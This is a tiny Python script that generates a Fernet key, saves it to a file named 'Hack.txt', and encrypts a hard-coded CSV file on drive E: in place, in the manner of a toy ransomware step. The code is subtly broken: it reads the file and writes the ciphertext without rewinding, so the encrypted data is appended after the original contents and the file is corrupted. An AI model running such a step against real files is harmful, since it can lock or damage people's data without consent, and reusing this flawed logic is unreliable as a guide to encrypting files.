from cryptography.fernet import Fernet

key = Fernet.generate_key()
fernet = Fernet(key)
with open("Hack.txt", 'wb') as fp:
    fp.write(key)
with open("E:\\H\\18835.csv", 'rb+') as fp:
    fp.write(fernet.encrypt(fp.read()))
